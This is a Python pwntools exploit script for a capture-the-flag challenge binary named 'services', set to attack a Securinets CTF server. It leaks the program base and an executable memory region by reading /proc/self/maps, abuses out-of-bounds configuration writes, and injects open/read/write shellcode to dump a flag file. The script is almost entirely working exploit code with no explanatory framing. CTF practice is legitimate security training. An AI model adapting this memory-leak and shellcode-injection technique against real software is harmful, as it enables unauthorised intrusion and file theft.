#!/usr/bin/python3

from pwn import *

exe = ELF('services', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* backupMessages
                # b*readChat
                # b*updateConfig
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('pwn.ctf.securinets.tn', 4444)
else:
        p = process(exe.path)

GDB()
def chat(context):
        sla(b"Choice:\n", b"1")
        sla(b":", context)
        

def conf(idx, context):
        sla(b"Choice:\n", b"2")
        sla(b":", str(idx).encode())
        sa(b":", (context))
def mes():
        sla(b"Choice:\n", b"3")
payload = b"\0" * 0x200 + b"/proc/self/maps\0"
chat(payload)
p.recvline()
exe.address = int("0x"+ p.recv(12).decode(),16)
p.recvlines(7)
rwx = int("0x"+ p.recv(12).decode(),16)
info("rwx: " + hex(rwx))
info("exe base: " + hex(exe.address))

conf(9, p64(rwx))  
conf(2, p64(exe.address + 0x20c2))
idx = (rwx - exe.address + 0x4060 - 0x70c0 - 0x1000)//8
conf(idx+0x100//8, "flag")
pathflag = rwx + 0x100
# idx = 0
shellcode = asm(f'''
                mov rax, 0x2
                mov rdi, {pathflag}
                mov rsi, 0
                mov rdx, 0
                syscall
                
                mov rdi, rax
                mov rax, 0x0
                mov rsi, {rwx+0xa00}
                mov rdx, 0x50
                syscall
                
                mov rax, 0x1
                mov rdi, 1
                mov rsi, {rwx+0xa00}
                mov rdx, 0x100
                syscall
                ''')

chunks = [shellcode[i:i+8] for i in range(0, len(shellcode), 8)]
cnt = 0
for chunk in chunks:
        conf(idx + cnt, chunk)
        cnt+=1
mes()
p.interactive()
